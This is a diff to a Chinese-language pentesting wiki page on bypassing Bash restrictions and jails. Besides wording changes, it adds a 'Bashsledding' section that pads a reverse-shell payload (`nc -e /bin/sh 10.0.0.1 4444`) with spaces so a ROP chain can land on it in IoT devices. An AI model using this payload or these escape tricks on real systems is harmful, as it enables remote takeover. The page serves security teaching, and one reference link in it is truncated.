@@ -144,7 +144,7 @@ echo ${PATH:0:1} #/
 
 ### 内置命令
 
-如果你无法执行外部函数，并且只能访问 **有限的内置命令以获得 RCE**，有一些方便的技巧可以做到这一点。通常你 **无法使用所有** 的 **内置命令**，所以你应该 **了解所有选项** 以尝试绕过监狱。这个想法来自 [**devploit**](https://twitter.com/devploit)。\
+如果你无法执行外部函数，并且只能访问 **有限的内置命令以获得 RCE**，有一些方便的技巧可以做到这一点。通常你 **无法使用所有** 的 **内置命令**，所以你应该 **了解所有选项** 以尝试绕过监狱。灵感来自 [**devploit**](https://twitter.com/devploit)。\
 首先检查所有的 [**shell 内置命令**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** 然后这里有一些 **建议**：
 ```bash
 # Get list of builtins
@@ -259,7 +259,7 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link
 ## to it in the current folder
 ```
-### 仅用 4 个字符实现 RCE
+### 4个字符的RCE
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -294,7 +294,7 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## 只读/无执行/无发行版旁路
+## 只读/无执行/无发行版绕过
 
 如果您在一个具有 **只读和无执行保护** 的文件系统中，甚至在一个无发行版容器中，仍然有方法可以 **执行任意二进制文件，甚至是一个 shell！:**
 
@@ -302,17 +302,39 @@ ln /f*
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot 和其他监狱旁路
+## Chroot 和其他监狱绕过
 
 {{#ref}}
 ../privilege-escalation/escaping-from-limited-bash.md
 {{#endref}}
 
-## 参考资料与更多
+## 基于空间的 Bash NOP 滑道 ("Bashsledding")
+
+当一个漏洞让您部分控制一个最终到达 `system()` 或另一个 shell 的参数时，您可能不知道执行开始读取您的有效载荷的确切偏移量。传统的 NOP 滑道（例如 `\x90`）在 shell 语法中 **不** 起作用，但 Bash 会在执行命令之前无害地忽略前导空格。
+
+因此，您可以通过在真实命令前加上一长串空格或制表符字符来创建一个 *Bash 的 NOP 滑道*：
+```bash
+# Payload sprayed into an environment variable / NVRAM entry
+"                nc -e /bin/sh 10.0.0.1 4444"
+# 16× spaces ───┘ ↑ real command
+```
+如果 ROP 链（或任何内存损坏原语）将指令指针放置在空间块内，Bash 解析器会简单地跳过空格，直到到达 `nc`，可靠地执行您的命令。
+
+实际使用案例：
+
+1. **内存映射配置块**（例如 NVRAM），可跨进程访问。
+2. 攻击者无法写入 NULL 字节以对齐有效负载的情况。
+3. 仅提供 BusyBox `ash`/`sh` 的嵌入式设备 – 它们也会忽略前导空格。
+
+> 🛠️  将此技巧与调用 `system()` 的 ROP 小工具结合使用，可以显著提高在内存受限的 IoT 路由器上的利用可靠性。
+
+## 参考资料与更多信息
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju)
+
+- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../banners/hacktricks-training.md}}
